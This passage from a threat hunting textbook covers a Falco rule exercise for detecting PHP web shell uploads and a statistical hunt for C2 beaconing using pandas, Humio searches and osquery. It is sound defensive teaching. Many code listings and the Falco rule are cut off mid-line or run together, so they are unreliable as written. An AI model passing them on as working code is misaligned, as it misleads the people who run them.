5. The threat hunter would provide a detailed report summarizing findings and recommendations about the threat hunt expedition.
Figure 5.7 Threat Hunting Process - Communication Phase

With all the knowledge we gained from the threat hunt expedition, let us have an exercise and then conclude the chapter.
5.4 Exercise
Towards the end of the threat expedition, we came across Falco, a tool that uses eBPF to provide security visibility and detection for Kubernetes. Review the Falco ruleset to understand the structure of how rules are structured. The latest default rules are published in https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml. In addition, review Falcon's supporting fields for conditions and outputs published in https://falco.org/docs/rules/supported-fields.
For this exercise:
1. Write a new rule that would detect uploading a php file to the following folder /var/www/html/wp-content/uploads. This is the folder where the attacker uploaded the web shell in Chapter 4. Please refer to Chapter 4 if you need more information about the web shell threat hunting expedition.
5.5 Answers to Exercise
Listing 5.26 Falco rule to detect php file
- macro upload_dir
  condition: fd.name startswith /var/www/html/wp-content/uploads  
 
- rule: Detect php file created
  desc: detect new php files created in /var/www/html/wp-content/u   condition: >
    upload_dir and fd.filename contain .php and evt.type = chmod o   output: >
    File below the upload directory opened for writing (user=%user     command=%proc.cmdline file=%fd.name parent=%proc.pname pcmdlin   priority: WARNING   tags: [webshell, php]
5.6 Summary
Threats hunters should have a good understanding of how cloud infrastructures are designed, built, and operated. In this chapter, our threat hunting landscape was a Kubernetes infrastructure hosted in a public cloud. Network and security concepts for containers and infrastructures hosting and orchestrating containers differ from virtual machines. Collecting data, monitoring for threats, and hunting need to evolve to address the change in concepts and the change in the threat landscape.
APIs are ubiquitous; unfortunately, many organizations have not yet deployed sufficient visibility controls. Data collection and threat hunting should expand to cover the API landscape, an area we practiced during our hunting expedition when we looked into the Kubernetes API server events. As a hunter, and depending on the environment, you want to gain visibility on deployed APIs, ensure that events are collected and stored and that your threat hunt expeditions can make good use of these events.
The work we practiced in this chapter with Google Kubernetes Engine would apply to other Kubernetes deployments hosted on other public or private clouds, using Kubernetes or other container orchestration tools.

6 Using Fundamental Statistical Constructs
This chapter covers
 Understanding how to make use of fundamental statistical constructs to build security analytic capabilities
 Understanding when and how to apply statistical constructs for threat hunting
 Applying statistics for anomaly detection to uncover activities that are outside of the norm
 Practice threat hunting to uncover malicious beaconing using fundamental statistical constructs applied to network connection events  Investigating endpoints using osquery to associate network connections with system processes
Now that we have conducted several threat hunting expeditions, let us explore how we can harvest the power of statistics in threat hunting. In this chapter, you will learn new skills that help you design and apply analytics using platforms that can connect to your datastore.
You are not expected to be a statistician to make good use of statistics, nor will you be one after finishing this chapter. You are a threat hunter who can understand and then use statistics to uncover clues. You can read about specific topics in statistics or work with a statistics expert if your direct or extended team (in-house or outsourced) has the required knowledge and expertise.
In this chapter, the statistics concepts we borrow are fundamental, e.g., standard deviation, yet can be powerful if properly designed and deployed. By the end of the chapter, you will have a good understanding of these concepts and how to apply them in your threat hunting expeditions.
We introduce you to the world of Jupyter Notebooks to build and apply statistical constructs for threat hunting. Some of these constructs are built-in within exiting datastore technologies such as Splunk and Elasticsearch, while others might require integration with external tools. In this chapter, we take a product-agnostic approach to applying statistical constructs to allow you to design and apply your analytics code and, if required, convert that to a version to use on Splunk, Elasticsearch, or others.
Building a level of programming knowledge is expected, Python for this chapter, to help you build simple Python-based Notebooks. You have the option of coding the same using other popular programming languages such as R.
In addition, we use osquery later in our expedition to build and execute Structured Query Language (SQL) commands against endpoints. If this is a too006C you use or plan to use, then a good understanding of building SQL queries will be beneficial.
Time to get some coffee before we start with the scenario.
6.1 Hunt for Compromised Systems Beaconing to C2
In the previous chapter, we relied on discrete indicators of compromise to uncover initial clues that led us to investigate further the threat execution and eventually prove the hypothesis. Let us recap some of the clues from the previous chapters. In Chapter 3, one of the clues was Microsoft Word writing a PowerShell script to disk and then getting that script executed using a series of commands. In Chapter 4, we were looking for suspicious uploads to specific directories. In Chapter 5, we were searching for suspicious calls to the Kubernetes API Server.
What if we do not have specific information to trigger that first standard search? Suppose that all we have is information about what a suspicious behavior might look like for a particular threat hunting landscape. For example, sending data at an average rate of 1Gbps is considered normal for one system, while somehow, it is abnormal for another. The same applies when analyzing other attributes such as the number of logins per day, the time of login, the length of web requests, the categories for web requests, etc. We could apply some analytics to one or more of these attributes and establish what a normal baseline looks like for an environment to uncover what could be perceived as abnormal.
Definition
Analytics is the scientific process of applying mathematical constructs to data to gain valuable and actionable insights. We used these mathematical constructs to build statistical and machine learning (ML) capabilities.
Not all tools have the same capabilities. For example, Humio focuses on delivering a datastore with fast search capabilities. For advanced analytics, you would use external tools that connect to Humio to pull data using the Humio API. On the other hand, Splunk Enterprise has functions and applications that allow you to deploy distributed statistical analytics using standard features or the Splunk Machine Learning Toolkit (MLTK) application. Similar to Splunk, Elasticsearch has statistical and machine learning libraries (for machine learning work, you are required to acquire a paid-based subscription.)
There are four types of data analytics: descriptive (find out what happened), diagnostic (find out why it happened), predictive (find out what is likely to happen), and prescriptive (find out what should be done).
When hunting, the two types of great interest are:
 Descriptive analytics allows us to analyze historical data by looking for patterns of interest. For example, can we spot a sudden increase in the number of failed login attempts by a system administrator in the last 90 days?
 Predictive analytics helps us compare what happened to what was likely to happen and evaluate if there is a significant difference between the two. Predictive analytics involves techniques such as regression analysis, forecasting, multivariate statistics, pattern matching, predictive modeling, and forecasting.
We start with a scenario that describes how to use simple statistical tools to uncover systems exhibiting beaconing behavior. Let us drill into the scenario.
6.1.1 Scenario: Searching for Malicious Beaconing
You have been tasked to look for signs of malicious beaconing activities to command and control (C2) servers from internal hosts to external IP addresses, regardless of the network port. In this setting, infected internal hosts would periodically try to connect to one or more C2 servers hosted externally on a regular basis, hence the term beaconing.
Not all network beaconing is malicious. Most would be normal traffic behavior, making it harder to uncover the malicious beaconing. Think about an anti-virus client connecting to its server to check for updates; it will do so on a regular schedule, i.e., exhibit beaconing-like behavior. The same applies to other clients, such as email clients regularly connecting to an email server to check for new emails or endpoint software and configuration clients regularly checking for the latest patches or updates.
Note Not all malware would beacon to C2 servers at regular intervals. Some might try to connect randomly. For example, in the famous SolarWinds incident, the SUNBURST client selects a random number of minutes to sleep before trying to connect to the C2 again. The threat hunt play in this section covers ones that connect in regular intervals.
Before we start the hunting expedition, let us try to answer the following questions:
1. What signs or patterns would help us uncover beaconing activities in general? We need to uncover connections that share the same source IP address, destination IP address, and destination port established by an internal host at regular intervals.
2. What data sources and event types help us uncover beaconing activities? We need to capture the time between the subsequent connections that share the same source IP address, destination IP address, and destination port for all network connections. We require events from a data source that can capture network connection attempts and provide timestamped events containing the source IP address, destination IP address, and destination port. Typical examples of the data sources include network firewalls, network devices with unsampled network flow, and network deep packet inspection tools such as Zeek (https://zeek.org).
3. What type of searches, or let us call them analytic functions, do we need to apply to uncover the patterns? Statistical constructs such as standard deviation and variance can come in handy when applied to uncover patterns, which in this case is consistency. For that, we first need to build datasets, each containing the time between subsequent connections that share the same source IP address, destination IP address, and destination port. To uncover consistency in the time interval between connections, we need to calculate the standard deviation for each dataset. We finally look for datasets that show consistency, i.e., low values for standard deviation. In a production environment, we should expect to build and analyze many datasets with the help of tools.
Definition
Variance is a measure of variability providing the degree of spread of a variable in a dataset. It is calculated by taking a dataset's average squared deviations from the mean.
To calculate the variance of a dataset, we first need to find the difference between each element in a dataset and the mean of that dataset. The variance is the average of the squares of those differences. We can express the variance, a2, using the following math expression:

In the above equation, n is the size of the dataset, xi is the value of the ith element in a dataset,  stands for the mean of the values in the dataset, xi -  is the deviation of the ith element in the dataset from the mean.
Definition
Standard deviation, a, is the square root of the variance and provides information about the deviation of data from the mean. If the points are further from the mean, there is a higher deviation within the data, but if they are closer to the mean, there is a lower deviation.

Note
You would not need to write new code to calculate the above statistical values for a dataset. Most systems will have built-in functions that you can call to calculate the mean, variance, and standard deviation.
Let us take a simple example: assume that you have a dataset with a single variable representing the length (number of characters) of URLs in web requests made by two users. In this example, s1 contains the URL lengths for user 1 and s2 for user 2.
s1 = {86, 63, 39, 45, 34, 44, 72, 50, 96, 77, 38} s2 = {86, 89, 86, 84, 101, 84, 83, 79, 88, 86, 84}
s1 has a variance of 457.27 and a standard deviation of 21.38, while s2 has a variance of 48.47 and a standard deviation of 6.96. The values demonstrate that the values in s2 are more consistent than in s1. The smaller the variance and standard deviation, the more consistent the values.
With this short introduction to a few statistical constructs, let us find out if we have the data sources we need for the threat hunting expedition.
6.1.2 Data Sources
We start with some good news. We have events that capture details of TCP and UDP connection information, covering all ports. These events are available in our datastore, Humio. In addition, we have events containing payloads of HTTP connections.
Let us have a look at sample logs for each type of event. The events are JSON-formatted, captured by Splunk Stream instances deployed in the network. Splunk Stream monitors network traffic of interest and captures metadata for network protocols. Other tools such as Zeek can deliver the same functions. Listing 6.1 shows a sample TCP connection event.
Listing 6.1 JSON-formatted TCP event
{
"sourcetype":"stream:tcp",                                        
"endtime":"2022-07-14T05:38:48.899088Z",                          
"timestamp":"2022-07-14T05:38:48.872696Z",                        
"bytes":1995,                                                     
"src_ip":"10.0.0.5",                                              
"src_mac":"00:0D:3A:9D:29:A8",                                    "src_port":50219,                                                 
...
"bytes_in":585,                                                   "data_packets_in":1,                                              
...
"packets_in":6,                                                   "app":"http",                                                     
...
"dest_ip":"104.18.11.207",                                        
"dest_mac":"12:34:56:78:9A:BC",                                   "dest_port":80,                                                   
...
"bytes_out":1410,                                                 
...
"packets_out":5,                                                  
... }
Now let us look at the content of the UDP connection event in Listing 6.2.
Listing 6.2 JSON-formatted UDP event
{
"sourcetype":"stream:udp",                                        
"endtime":"2022-07-14T05:38:48.872122Z",                          
"timestamp":"2022-07-14T05:38:48.867642Z",                        
"bytes":198,                                                      "src_ip":"10.0.0.5",                                              
"src_mac":"00:0D:3A:9D:29:A8",                                    
"src_port":56219,                                                 
"bytes_in":83,                                                    
"packets_in":1,                                                   
"app":"windows_azure",                                            
"dest_ip":"168.63.129.16",                                        
"dest_mac":"12:34:56:78:9A:BC",                                   
"dest_port":53,                                                   
"bytes_out":115,                                                  "packets_out":1,                                                  
... }
The last event we examine is for HTTP connections in Listing 6.3.
Listing 6.3 JSON-formatted HTTP event
{
"sourcetype":"stream:http",                                       
"endtime":"2022-07-14T05:38:48.896989Z",                          
"timestamp":"2022-07-14T05:38:48.889366Z",                        
"bytes":1364,                                                     
"bytes_in":249,                                                   
"bytes_out":1115,                                                 
"dest_ip":"104.18.11.207",                                        
"dest_mac":"12:34:56:78:9A:BC",                                   
"dest_port":80,                                                   
"flow_id":"fc6c7d04-be66-4a86-8dc8-f514d54d1bc5",                 
"http_comment":"HTTP/1.1 200 OK",                                 
"http_content_type":"text/html",                                  
"http_method":"GET",                                              "http_user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3)
...
"site":"maxcdn.bootstrapcdn.com",                                 "src_ip":"10.0.0.5",                                              
...
"status":200,                                                     
...
"uri_path":"/",                                                   }
With the knowledge that we have so far about events, let us introduce the tool that we will use in this chapter to run our statistical analysis code.
6.1.3 Running Statistical Analysis Work
To perform statistical analysis, we will use Jupyter Notebooks to pull events from the datastore, Humio, and process them. Jupyter is a community-run project to develop open-source software, open standards, and services for interactive computing across programming languages. Jupyter Notebooks, on the other hand, are documents that combine live runnable code with narrative text such as text and images.
Jupyter supports many programming languages (called "kernels" in the Jupyter ecosystem), including Python, Java, R, Julia, Matlab, Scala, and many more. At the time of writing this chapter, Jupyter will run the IPython kernel with Python 3 out of the box, but additional kernels are supported. In this chapter, we use IPython for our kernel.
Note
Do not worry much if programming is not your favorite subject. The code is simple, and we describe each line of the code we use in our Jupyter Notebooks. The code is easy to read and is made available for you on our GitHub repository, along with the data, for you to explore and execute.
The following snapshot shows what a Jupyter notebook would look like. The snapshot contains text written in Markdown (plain text formatting syntax) followed by code. Jupyter provides an easy and interactive platform to perform analytics using a programming language such as Python.

With this short introduction to Jupyter, let us look at osquery, a tool that provides direct access to information on endpoints.
6.1.4 Osquery
In addition to the network events, we have remote access to the endpoint through osquery, a tool that allows us to query endpoints using SQL-based queries. You can install osquery (https://osquery.io/) on different operating systems such as Windows Linus and MacOS.
Osquery exposes an operating system as a relational database and uses SQL queries to explore operating system data. With osquery, SQL tables abstract running processes, loaded kernel modules, open network connections, browser plugins, hardware events, or file hashes. Listing 6.4 is an example of queuing for running processes along with their hash values on a Windows 10 endpoint.
Listing 6.4 Osquery SQL-based query
SELECT p.pid, p.name, p.path, p.cmdline, p.state, h.sha256 \
FROM processes p INNER JOIN hash h ON p.path=h.path;              
Executing the above code generates the output in Listing 6.5
Listing 6.5 Output of osquery run showing running processes
pid: 8840                                                         name: cmd.exe                                                     path: C:\Windows\System32\cmd.exe                                 cmdline: "C:\Windows\system32\cmd.exe"                            state: STILL_ACTIVE                                               sha256:b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c8
Access to a tool such as osquery is very handy during a threat hunting expedition. It provides threat hunters direct access to data on endpoints that might not have been collected and stored centrally in a datastore - for example, performing a real-time query to fetch the content of a registry key in a windows endpoint.
Now that we reviewed the events and tools we would use for the threat hunting expedition, let us start with fetching events from our datastore, Humio, to Jupyter.
6.1.5 Hunting Expedition: Searching to Beaconing
To run our analysis, we first need to collect fields in events from our datastore. We do not need to pull the raw events; that will consume more time and bandwidth.
Acquire and Prepare Data
To prepare for the hunting expedition, let us start by collecting the fields we need from our datastore, Humio, into Jupyter. The Jupyter Notebook code in
Listing 6.6 shows the python code that does that. Information on the Humio API library can be found on https://github.com/gwtwod/humioapi and https://github.com/humio/python-humio.
Listing 6.6 Jupyter notebook - Collect events from the Humio datastore
import humioapi                                                   import pandas as pd                                               api = humioapi.HumioAPI(**humioapi.humio_loadenv())               stream = api.streaming_search(                                        query="sourcetype=stream:tcp OR sourcetype=stream:udp \           | findTimestamp(field=timestamp, as=epoch_timestamp) \        
    | findTimestamp(field=endtime, as=epoch_endtime) \                | select([epoch_timestamp, epoch_endtime, host.name, sourcetyp     repo='Threat_Hunting',                                            start="-24h@h",                                                   stop="now"                                                    
)
df = pd.DataFrame(stream)                                         print(len(df.index), "records fetched.")                          
Executing the above code allows you to connect to your Humio instance to pull fields of interest from matching events into Pandas DataFrame, a twodimensional data structure similar to a table with rows and columns. You can think of a Pandas DataFrame as a spreadsheet with rows associated with column headers. Every row in the DataFrame represents an event, while every column represents the fields extracted in our query command:
epoch_timestamp, epoch_endtime, host.name, sourcetype, app, src_ip, src_port, dest_port, dest_ip, bytes, bytes_in and bytes_out.
Note
Pandas is a software library written for data manipulation and analysis using Python.
In our case, executing the search against the datastore, Humio, returned a total of 586,102 events matching the search.
Note
In large deployments and depending on the network session monitoring scope, the number of connections captured would be far more than the number of connections fetched in our scenario.
Note
You can connect and query other datastores such as Splunk, Elasticsearch, Spark, and Hadoop to retrieve raw or processed events.
We are searching for repeated connections that share the same source IP address, destination IP address, and destination port. To carry out reliable analysis, the number of connections should be statistically significant, i.e., we should have a dataset of sufficient size. To uncover beaconing activities, a dataset made of few records, e.g., 10, might not be statistically significant.
Note
Building and then applying analytics can take a considerable amount of time. For large datasets, you might want to start applying analytics on samples obtained from the original dataset (population).
In our hunting expedition, we will process all the connections without sampling.
We need to look for a minimum number of repeated connections that share the same attributes: source IP address, destination IP address, and destination port, to have a good representation of what could be later classified as a beaconing activity based on further analysis.
Let us look for repeated connections that share the same source IP address, destination IP address, and destination port that exceed count_threshold, set to 100 in events collected in the last 24 hours. Filtering for repeated connections that exceed count_threshold will reduce the dataset size and help us speed up the analytics execution time later. The following code in Listing 6.7 shows how to do that.
Note
Setting the value of count_threshold depends on factors that you can assume, such as the time range of your search, how frequent the call home events are and how many of these events were captured. For example, the longer your search range the higher the value of count_threshold.
Listing 6.7 Jupyter notebook code - Filter events based on a count threshold
count_threshold = 100                                             df = df.groupby(['src_ip', 'dest_ip', 'dest_port']).filter(lambda df = df.reset_index()                                             print(len(df.index), "records with count >", count_threshold)     
In our case, the code execution returned a total of 428,189 rows.
We are almost ready to calculate the time differences between connections that share the same source IP address, destination IP address, and destination port. In Listing 6.8, we examine the data type (dtype) of fields in the return connection records to ensure we can process them later.
Listing 6.8 Jupyter notebook - Data type (type) of each column
df.dtypes                                                         
The following shows the returned column types; all the fields, but index and @timestamp, are of type object.
Listing 6.9 Jupyter notebook output - DataFrame column types
index               int64                                         bytes_in           object                                         
@timestamp          int64 src_ip             object dest_ip            object bytes              object dest_port          object epoch_timestamp    object bytes_out          object app                object epoch_endtime      object src_port           object sourcetype         object
We need to convert columns of type of object to type integer to be able to perform arithmetic calculations on them later. The code in Listing 6.10 does that.
Listing 6.10 Jupyter notebook code - Convert columns of type of object to type integer
df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int)
Now that we have the information on repeated connections with the correct column type let us do more numbers crunching.
Process Data
We are ready now to calculate the time difference between connections. In Listing 6.11, we calculate the time difference in milliseconds and seconds. The field epoch_timestamp contains the connection timestamp with millisecond resolution.
Listing 6.11 Jupyter notebook code - Calculate the time difference between similar connections
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', 'dest_port df['time_diff_sec'] = df['time_diff_msec'].div(1000)              
Now that we have the time difference between connections that share the same source IP address, destination IP address, and destination port, let us calculate the standard deviation, variance, and the number of connections for every dataset. The dataset includes the time difference between connections that share the same source IP address, destination IP address, and destination port.
In Listing 6.12, we calculate both standard deviation and variance; later, we will use one standard deviation to measure the level of consistency.
Listing 6.12 Jupyter notebook code - Calculate standard deviation, variance and count
df['std1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['var1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['count1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['t Let us display the fields we have calculated in Listing 6.12.
Listing 6.13 Jupyter notebook code - Display selected columns in the DataFrame df
df[['src_ip', 'dest_ip', 'dest_port', 'std1', 'var1', 'count1', 'a Figure 6.1 shows the fields after running the above code.
Figure 6.1 Snapshot showing selected columns in DataFrame df

The same values of std1, var1, and count are available in each row that shares the same src_ip, dest_ip, and dest_port. This allows to drop the duplicate records and keep a single entry for each. The code below does exactly this.
Listing 6.14 Jupyter notebook code - Connections in ascending order based on standard deviation
unique_df = df.drop_duplicates(['src_ip', 'dest_ip', 'dest_port']) unique_df[['src_ip', 'dest_ip', 'dest_port', 'std1', 'var1', 'coun
The output of executing the above code shows 621 unique rows based on source IP address, destination IP address, and destination port, all with more than 100 repeated connections. Figure 6.2 shows the output.
Figure 6.2 Snapshot showing selected columns in ascending order based on std1 for DataFrame df

What is more important is that the output shows that some datasets with low standard deviation and variance values, others with very high standard deviation and variance values. For example, there were 107 connections between 10.0.0.10 and 108.138.128.47 over port 443 with a very high standard deviation of 39,778, which indicates the inconsistency of time between connections. On the other hand, there were 155 connections between
10.0.0.8 and 52.226.139.185 over port 443 with a very small standard deviation of 0.053964, which indicates high consistency in the time between the connections.
Identify Beaconing
Now that we have calculated the standard deviation and variance values, it is time to look for repeated connections with small standard deviation and variance values, which could indicate beaconing activities, whether malicious or not. I am sure you have been waiting to reach this stage of our analysis.
In our threat hunting expedition, we are after consistency which may indicate a beaconing behavior, i.e., we are after a dataset of connections with low values of standard deviation and variance. We will start by looking for records with standard deviation values of less than 100.
Listing 6.15 Jupyter notebook code - Keep rows with low standard deviation values
std_threshold = 100                                               unique_df = unique_df.loc[unique_df['std1'] < \ std_threshold].sor unique_df[['src_ip', 'dest_ip', 'dest_port', 'std1', 'var1', 'coun
Executing the code reduces the number of records to 50, down from 621, and a number that we can work with to start drilling into the records.
Figure 6.3 shows some of the returned records. The first column is the index number. The remaining fields are the ones we selected in the DataFrame display code in Listing 6.15.
Figure 6.3 Rows with std1 < std_threshold

Let us pause for a minute to summarize what we have done so far:
1. We collected a total of 586,102 from the datastore.
2. We searched for connections that shared the same source IP address, destination IP address, and destination port, repeated more than 100 times. The search resulted in 428,189 records.
3. We removed the duplicate records that share the same source IP address, destination IP address, and destination port, leaving a single copy of
each. We ended with 621 unique records, a high number we need to optimize further.
4. We finally looked for repeated connections exhibiting consistency. We did that by looking for records with standard deviation values of less than 100, resulting in 50 records.
With 50 records to look at, let us list the destination IP addresses and ports in these records.
Listing 6.16 Jupyter notebook code - Summarize the unique destination IP addresses
unique_df = unique_df.loc[unique_df['src1'] < \ std_threshold].dro unique_df[['dest_ip']].sort_values(by=['dest_ip'], ascending=True)
Executing the above code returns the following combinations of destination IP addresses and ports, containing a mix of internal and public IP addresses, shown in Listing 6.17.
Listing 6.17 Jupyter notebook output - Summarize the unique destination IP addresses
dest_ip                 dest_port
416742              10.0.0.10               3389
18695               10.0.0.11               80
18733               10.0.0.12               80
18415               10.0.0.6                80
18585               10.0.0.7                80
18567               10.0.0.8                80
18559               10.0.0.9                80
18569               168.63.129.16           80
18568               169.254.169.254         80
23221               208.80.154.224          443
85994               34.125.188.180          80
18538               44.238.73.15            9997
20696               52.226.139.121          443
23287               52.226.139.180          443
20667               52.226.139.185          443
In this hunting expedition, we focus on beaconing activities from internal hosts to external addresses, which drives us to investigate the external IP addresses in the above output.
Note
This is not to say that we should discard entries showing 10.0.0.x as destination IP addresses. We would keep a record of what we observed so far and look at these connections at a later stage of your threat hunt.
Our research of the external IP addresses in Listing 6.17 reveals the following:
 168.63.129.16 and port 80: 168.63.129.16 is used by Microsoft as a virtual public IP address to facilitate a communication channel to Microsoft Azure platform resources. Our systems are hosted on Microsoft Azure, so we expect the Windows endpoints to regularly communicate with this IP address.
 169.254.169.254 and port 80: 169.254.169.254 is a non-routable public IP address used by Microsoft Azure Instance Metadata Service (IMDS) to retrieve metadata about virtual machines hosted on Azure.
 208.80.154.224 and port 443: 208.80.154.224 belongs to Wikimedia and hosts domains such as wikipedia.org and wikidata.org.
 34.125.188.180 and port 80: 34.125.188.180 is hosted on Google Cloud Platform (GCP).
 44.238.73.15 and port 9997: 44.238.73.15 is the Cribl Stream Cloud service IP address hosted on Amazon Web Services (AWS). Cribl Stream is our centralized event collection and forward. Our Windows endpoints hosted on Azure have the Splunk Universal Forwarder agent installed. The agent is configured to regularly connect to this IP address using port TCP/9997 to forward logs.
 52.226.139.121, 52.226.139.180, and 52.226.139.185: IP addresses that belong to Azure Traffic Manager service with many hosts under the domain trafficmanager.net (e.g., wns.notify.trafficmanager.net).
Listing 6.18 shows the certificate associated with the three IP addresses.
Listing 6.18 Certificate served by 52.226.139.121,.180, and.185
| ssl-cert: Subject: commonName=*.wns.windows.com
| Subject Alternative Name: DNS:*.wns.windows.com
| Issuer: commonName=Microsoft RSA TLS CA 01/organizationName=Micr
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-17T17:44:18
| Not valid after:  2022-08-17T17:44:18
| MD5:   5026 d976 ee05 424f 4b24 1742 ec05 c787
|_SHA-1: 1020 5fad 537a 4c88 6af2 664f 549c a3c2 4099 8bd4
This leaves us with two IP addresses to investigate further, 208.80.154.224 and 34.125.188.180. We would add the rest of the IP addresses to a whitelist to exclude them in future hunting expeditions.
Beaconing to 208.80.154.224
Starting with 208.80.154.224, let us find the machines connecting to this IP address. To do that, we can switch to searching events directly in our datastore, Humio. It would be easier and faster.
Listing 6.19 Humio search code - IP addresses communicating with 208.80.154.224
(sourcetype=stream:tcp OR sourcetype=stream:udp ) AND \ dest_ip=20
| groupBy(["src_ip", "dest_ip","dest_port", "app", "sourcetype"]) 
The above output shows several internal hosts connecting to 208.80.154.224 using ports TCP/80 and TCP/443. In addition, Stream identified wikipedia as the application used in these connections. This aligns with the domains we identified earlier for this IP address.
Listing 6.20 Humio search output - Output of the search of IP addresses communicating with
208.80.154.224
src_ip      dest_ip          dest_port app            Sourcetype  10.0.0.10    208.80.154.224     80     wikipedia     stream:tcp   10.0.0.9     208.80.154.224     443    wikipedia     stream:tcp   10.0.0.7     208.80.154.224     443    wikipedia     stream:tcp   10.0.0.8     208.80.154.224     443    wikipedia     stream:tcp   10.0.0.4     208.80.154.224     80     wikipedia     stream:tcp   10.0.0.12    208.80.154.224     443    wikipedia     stream:tcp   10.0.0.11    208.80.154.224     80     wikipedia     stream:tcp   10.0.0.6     208.80.154.224     443    wikipedia     stream:tcp   10.0.0.6     208.80.154.224     80     wikipedia     stream:tcp   10.0.0.7     208.80.154.224     80     wikipedia     stream:tcp   10.0.0.8     208.80.154.224     80     wikipedia     stream:tcp   10.0.0.11    208.80.154.224     443    wikipedia     stream:tcp   
10.0.0.10    208.80.154.224     443    wikipedia     stream:tcp   
10.0.0.4     208.80.154.224     443    wikipedia     stream:tcp   
Checking the certificate hosted on the IP address shows that it is a valid one and issued to multiple wiki domains, as shown in Listing 6.21.
Listing 6.21 Certificate served by 208.80.154.224
| ssl-cert: Subject: commonName=*.wikipedia.org
| Subject Alternative Name: DNS:*.m.mediawiki.org, DNS:*.m.wikiboo
    ...
    DNS:wikiversity.org, DNS:wikivoyage.org, DNS:wiktionary.org, D
| Issuer: commonName=R3/organizationName=Let's Encrypt/countryName
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-10T06:22:07
| Not valid after:  2022-10-08T06:22:06
| MD5:   529c 7963 c62b e1a6 1792 46af 7800 3ebc |_SHA-1: 2a6f bcf5 e895 edd2 737a 2998 c956 a0ac f37f a826
(This output is edited for brevity.)
Nothing super suspicious yet about this IP address, but let us investigate further. We have another set of events that might be useful here, ones with a sourcetype of stream:http and capture HTTP payloads. In Listing 6.22, we search HTTP events containing 208.80.154.224.
Listing 6.22 Humio search code - Search for 208.80.154.224 in events with sourcetype stream:http
sourcetype=stream:http AND 208.80.154.224                         | table([site, uri_path, status])                                 Listing 6.23 shows the output of the search.
Listing 6.23 Humio search output - Events of sourcetype stream:http containing 208.80.154.224
site uri_path status
commons.wikimedia.org /wiki/Commons:Media_help/nl 301             commons.wikimedia.org /wiki/File:Gnome-audio-x-generic.svg 301 commons.wikimedia.org /w/api.php 301 commons.wikimedia.org /w/index.php 301 commons.wikimedia.org /wiki/Commons:Media_help 301
... en.wikipedia.org/wiki/O_RLY 301
The output shows web crawling behavior. Examining the uri_path content does not reveal malicious intent so far, but still, observing this behavior from multiple endpoints should be of concern. Using our Jupyter Notebook, let us visualize the time interval between connections from 10.0.0.4 to 208.80.154.224. You can perform the same for other internal IP addresses (10.0.0.6-12 ) communicating with 208.80.154.224.
Listing 6.24 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.4 and 208.80.154.224 over port 443
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '208.80.154
Figure 6.4 shows the line graph generated by executing the code in Listing 6.24.
Figure 6.4 Time difference in seconds over time for connections between 10.0.0.4 and 208.80.154.224 over port 443

In Figure 6.4, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec.
Figures 6.4 does not reveal much, apart from that the value of time_diff_sec has a large range. We can examine and visualize the distribution of values of time_diff_sec by building a histogram using the following code to gain a better understanding of time_diff_sec.
Definition
A histogram is a column chart that shows frequency data. In a histogram, data is grouped into continuous number ranges, and each range corresponds to a vertical bar.
Listing 6.25 Jupyter notebook code - Plot the value of time_diff_sec for connections between
10.0.0.4 and 208.80.154.224 over port 443
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '208.80.154
Figure 6.5 shows the line graph generated by executing the code in Listing 6.25.
Figure 6.5 Distribution of time_diff_sec between 10.0.0.4 and 208.80.154.224 over port 443

In Figure 6.5, the x-axis represents the value of time_diff_sec, and the yaxis represents the value of the number of occurrences.
We need to investigate this further, so we will record our findings and move on to the second IP address of concern, 34.125.188.180.
You might want to refill your cup of coffee (or tea!) before we start investigating the second IP address.
Beaconing to 34.125.188.180
34.125.188.180 is hosted on GCP and has no recent domains associated with it based on queuing VirusTotal and Umbrella. Similar to the work we have done for the previous IP address, we will start by finding the endpoints connecting to this IP address. To do that, we will switch to searching events directly in our datastore, Humio. Listing 6.26 shows the search command.
Listing 6.26 Humio search code - IP addresses communicating with 34.125.188.180
(sourcetype=stream:tcp OR sourcetype=stream:udp ) AND \ dest_ip=34
| groupBy(["src_ip", "dest_ip","dest_port", "sourcetype"])        Listing 6.27 shows the output of the search.
Listing 6.27 Humio search output - IP addresses communicating with 34.125.188.180
src_ip     dest_ip         dest_port   app      sourcetype     cou 10.0.0.4   34.125.188.180  80          unknown  stream:tcp     770
10.0.0.4   34.125.188.180  80          http     stream:tcp     755
The output in Listing 6.27 shows a single internal host, 10.0.0.4, connecting 1525 (770+755) times to 34.125.188.180 over port 80.
In the matching events, Splunk Stream identified http as the application used for 755 of these connections and unknown for the rest.
Let us pivot to stream:http events to investigate the HTTP request payloads. In Listing 6.28, we perform a quick count of stream:http events that contain
34.125.188.180.
Listing 6.28 Humio search code - Count stream:http events containing 34.125.188.180
sourcetype=stream:http AND 34.125.188.180 | count()
The search returns 755, which corresponds to the search output in Listing 6.27, which also shows 755 events with the app field set to http. What do these HTTP requests contain? Let us display the content of the stream:http events. Listing 6.29 displays the output in a table format showing the fields site, uri_path and status.
Listing 6.29 Humio search code - Search for 34.125.188.180 in events with sourcetype stream:http
sourcetype=stream:http AND 34.125.188.180 | groupby([site, uri_path, status])
Listing 6.30 shows the output of the search.
Listing 6.30 Humio search output - Events of sourcetype stream:http containing 34.125.188.180
site               uri_path        status   count
<no value>         <empty string>  500     
34.125.188.180     /submit.php      200     73 34.125.188.180     /cm              200     677
34.125.188.180     /b               404     2 
34.125.188.180     /b               200     1
The output shows status 200 (success) for most of the requests: 73 requests to
/submit.php, 677 requests to /cm and 1 request to /b. These are interesting repeated requests, happening at a regular interval based on the standard deviation value we calculated earlier (std1< 100).
